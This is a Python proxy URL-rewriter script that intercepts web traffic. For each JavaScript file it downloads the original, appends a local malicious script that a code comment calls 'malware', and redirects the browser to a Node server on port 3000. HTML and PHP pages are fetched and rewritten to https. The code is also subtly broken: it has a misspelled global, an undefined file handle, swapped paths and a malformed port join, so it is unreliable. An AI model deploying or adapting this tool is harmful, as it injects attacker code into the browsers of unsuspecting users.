#!/usr/bin/env python3

from sys import argv,stdin,stdout
from os import getpid
import re
from subprocess import call
from datetime import datetime

count = 0
pid = str(getpid())
pattern = r'\.js'
senderpattern = r'\{ip\}'
saveDirectory = "/generated_js/" #should be webdir
maliciousJS = "w.js"
# Node JS server IP address
newip = "test-domain.qpizzle.com"
# Node JS server port
newport = "3000"

def processJS(old_url):
    global pid
    global savDirectory
    global newfilename
    global port
    global line_list
    global newip
    global newport
    logfile = '/tmp/rewrite_js_log' #for logging which files have been processed
    with open(logfile,'a') as log:
        log.write("[{}] targeted file {}\n".format(datetime.now(), old_url))
    newfilename = pid+'-'+str(count)+'.js'
    newfile = saveDirectory+newfilename
    call(["wget","-q","-O",newfile,old_url+str(port)])
    with open(logfile,'a') as log:
        log.write("[{}] downloaded file {}\n".format(datetime.now(), old_url))
    call(["chmod","a+r",newfile])
    with open(logfile,'a') as log:
        log.write("[{}] set perms on {}\n".format(datetime.now(), old_url))
    with open(newfile,"a") as f:

        #being lazy with javascript appending malware thing
        with open(saveDirectory+maliciousJS,"r") as j:
            if len(line_list) >= 2:
                connector = line_list[1]
            else:
                connector = "ERROR"
            f.write( re.sub(senderpattern,connector,j.read()) )
    with open(logfile,'a') as log:
        log.write("[[{}] read and wrote {}\n".format(datetime.now(), old_url))
    call(["chmod","a+r",saveDirectory+maliciousJS])
    stdout.write('OK [status=30N] url="https://{}:{}/html/{}"\n'.format(newip,newport,newfilename))
    with open(logfile,'a') as log:
        log.write("[{}] wrote file {} to {}\n".format(datetime.now(), old_url, newfilename ))    

def processHTML(old_url):
    global pid
    global savDirectory
    global newfilename
    global port
    global line_list
    global newip
    global newport
    logfile = '/tmp/rewrite_html_log'
    with open(logfile,'a') as log:
        log.write("[{}] targeted file {}\n".format(datetime.now(), old_url))
    newfilename = pid+'-'+str(count)+old_url.rsplit('.',1)[1]
    newfile = saveDirectory+newfilename
    call(["wget","-q","-O",newfile,old_url+str(port)])
    with open(logfile,'a') as log:
        log.write("[{}] downloaded file {} to {}\n".format(datetime.now(), old_url,newfile))
    call(["chmod","a+r",newfile])
    with open(logfile,'a') as log:
        log.write("[{}] set perms on {}\n".format(datetime.now(), old_url))
    with open(newfile,"r+") as f:
        data = r.read()
        f.write( re.sub(r'http://',r'https://', data ))
    with open(logfile,'a') as log:
        log.write("[[{}] read and wrote {}\n".format(datetime.now(), old_url))
    call(["chmod","a+r",saveDirectory+maliciousJS])
    
    stdout.write('OK [status=30N] url="https://{}:{}/js/{}"\n'.format(newip,newport,newfilename))
    
    with open(logfile,'a+') as log:
        log.write("[{}] wrote file {} to {}\n".format(datetime.now(), old_url, newfilename ))    


while True:
    line = stdin.readline().strip()
    if line == '': 
        continue
    line_list = line.split(' ')
    old_url = line_list[0]
    port = '' 
    if ':' in old_url:
        old_url, port  = old_url.rsplit(':',1)
        try:
            port = int(port)
        except:
            old_url = old_url + ':' + port    
            port = ''
    with open('/tmp/rewrite_log_urls','a+') as f:
        if r'.js' in old_url:
            f.write('[JS]'+old_url+port+'\n')
        else:
            f.write('[OL]'+old_url+'\n')

    if r'.js' in old_url:
        processJS(old_url)
    elif r'.html' in old_url:
        processHTML(old_url)
    elif r'.php' in old_url:
        processHTML(old_url)
    else:
        stdout.write(line_list[0] +'\n')
    
    stdout.flush()
    count+= 1

